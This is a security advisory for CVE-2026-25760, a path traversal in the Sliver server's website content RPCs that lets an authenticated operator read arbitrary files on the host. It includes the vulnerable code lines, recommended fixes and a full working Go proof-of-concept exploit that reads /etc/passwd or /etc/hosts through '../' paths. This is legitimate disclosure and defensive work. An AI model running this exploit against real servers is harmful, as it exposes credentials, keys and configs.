# [M] Sliver Vulnerable to Website Path Traversal / Arbitrary File Read (Authenticated)

## Summary
Severity: Medium
Advisory: GHSA-2286-hxv5-cmp2
CVE: CVE-2026-25760
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-02-05
Source: https://github.com/advisories/GHSA-2286-hxv5-cmp2
Type: github-advisory

## Affected
- Go: `github.com/bishopfox/sliver` — affected >=0 <1.6.11

## Details
## Summary
A Path Traversal vulnerability in the website content subsystem lets an authenticated operator read arbitrary files on the Sliver server host. This is an authenticated **Path Traversal / arbitrary file read** issue, and it can expose credentials, configs, and keys.

## Affected Component
- Website content management (gRPC): `WebsiteAddContent`, `Website`, `Websites`
- Server-side file read in `Website.ToProtobuf`

## Impact
- **Arbitrary file read** as the Sliver server OS user.
- Exposure of sensitive data such as operator configs, TLS keys, tokens, and logs.

## Root Cause
The server accepts and persists arbitrary website paths from the operator, then later reads from disk using that path without sanitization or containment.

## Vulnerable Code References
- `server/rpc/rpc-website.go:100` — accepts `content.Path` from operator RPC and persists it via `website.AddContent`
- `server/db/models/website.go:52` — reads from disk with `filepath.Join(webContentDir, webcontent.Path)` without validating or constraining `webcontent.Path`

## Proof of Concept (PoC)

### Steps (local test)
1. Build the server:
   ```bash
   go build -mod=vendor -tags go_sqlite,server -o sliver-server ./server
   ```
2. Create an operator config (permission `all` for website operations):
   ```bash
   ./sliver-server operator -n testop -l 127.0.0.1 -p 31337 -P all -o file -s /tmp
   ```
3. Start the daemon:
   ```bash
   ./sliver-server daemon -l 127.0.0.1 -p 31337
   ```
4. Run the PoC:
   ```bash
   GOFLAGS=-mod=vendor go run ./poc/website_path_traversal.go -config /tmp/testop_127.0.0.1.cfg -website poc-site -target /etc/hosts
   ```


### PoC Code
```go
package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/bishopfox/sliver/client/assets"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
)

func main() {
	var (
		configPath  string
		websiteName string
		targetPath  string
		webPath     string
		maxBytes    int
	)
	flag.StringVar(&configPath, "config", "", "path to sliver client config (.cfg)")
	flag.StringVar(&websiteName, "website", "poc-site", "website name to use/create")
	flag.StringVar(&targetPath, "target", "", "absolute server file path to read")
	flag.StringVar(&webPath, "web-path", "", "override web path (defaults to traversal into target)")
	flag.IntVar(&maxBytes, "max-bytes", 1024, "max bytes of leaked content to print")
	flag.Parse()

	if targetPath == "" {
		if runtime.GOOS == "windows" {
			targetPath = `C:\\Windows\\System32\\drivers\\etc\\hosts`
		} else {
			targetPath = "/etc/passwd"
		}
	}

	if webPath == "" {
		trimmed := strings.TrimPrefix(targetPath, string(filepath.Separator))
		webPath = "../../../../../../../../" + trimmed
	}

	config, err := loadConfig(configPath)
	if err != nil {
		fatalf("config error: %v", err)
	}

	rpc, conn, err := transport.MTLSConnect(config)
	if err != nil {
		fatalf("connect error: %v", err)
	}
	defer conn.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	_, err = rpc.WebsiteAddContent(ctx, &clientpb.WebsiteAddContent{
		Name: websiteName,
		Contents: map[string]*clientpb.WebContent{
			webPath: {
				Path:        webPath,
				ContentType: "text/plain",
				Content:     []byte("poc"),
			},
		},
	})
	if err != nil {
		fatalf("WebsiteAddContent failed: %v", err)
	}

	resp, err := rpc.Website(ctx, &clientpb.Website{Name: websiteName})
	if err != nil {
		fatalf("Website failed: %v", err)
	}

	var leaked *clientpb.WebContent
	for _, c := range resp.Contents {
		if c.Path == webPath {
			leaked = c
			break
		}
	}
	if leaked == nil {
		fatalf("did not find content for path %q", webPath)
	}

	data := leaked.Content
	if len(data) > maxBytes {
		data = data[:maxBytes]
	}

	fmt.Printf("[+] target: %s\n", targetPath)
	fmt.Printf("[+] web-path: %s\n", webPath)
	fmt.Printf("[+] leaked bytes: %d\n", len(leaked.Content))
	fmt.Printf("[+] preview:\n%s\n", string(data))
}

func loadConfig(path string) (*assets.ClientConfig, error) {
	if path != "" {
		return assets.ReadConfig(path)
	}
	configs := assets.GetConfigs()
	if len(configs) == 0 {
		return nil, fmt.Errorf("no configs found; use -config")
	}
	if len(configs) > 1 {
		return nil, fmt.Errorf("multiple configs found; use -config")
	}
	for _, c := range configs {
		return c, nil
	}
	return nil, fmt.Errorf("unexpected config error")
}

func fatalf(format string, args ...any) {
	fmt.Fprintf(os.Stderr, format+"\n", args...)
	os.Exit(1)
}
```

### Expected Output (example)
```
[+] target: /etc/hosts
[+] web-path: ../../../../../../../../etc/hosts
[+] leaked bytes: 409
[+] preview:
127.0.0.1	localhost
...
```

## Evidence (Screenshots)
<img width="930" height="649" alt="path-traversal-poc" src="https://github.com/user-attachments/assets/53d18a4b-9da9-49db-b7c4-cf1fefe760fe" />

## Why It Works
- `WebsiteAddContent` accepts a path like `../../../../etc/hosts` and stores it.
- `Website` returns content by calling `Website.ToProtobuf`, which reads from disk using the stored `Path` value.
- `filepath.Join` does not prevent traversal, so the server reads from outside the web directory.

## Recommended Fix
- Validate and reject paths that are absolute or contain `..` in `WebsiteAddContent` (server side).
- Canonicalize paths and enforce they remain within the web content directory.
- Avoid reading content by `Path` in `Website.ToProtobuf`; read by content ID instead.

## Notes
- This issue requires an authenticated operator account with sufficient permissions (`PermissionAll`).
- The PoC demonstrates reading `/etc/hosts` but can target any readable server file.

## References
- https://github.com/BishopFox/sliver/security/advisories/GHSA-2286-hxv5-cmp2
- https://nvd.nist.gov/vuln/detail/CVE-2026-25760
- https://github.com/BishopFox/sliver/commit/818127349ccec812876693c4ca74ebf4350ec6b7
- https://github.com/BishopFox/sliver
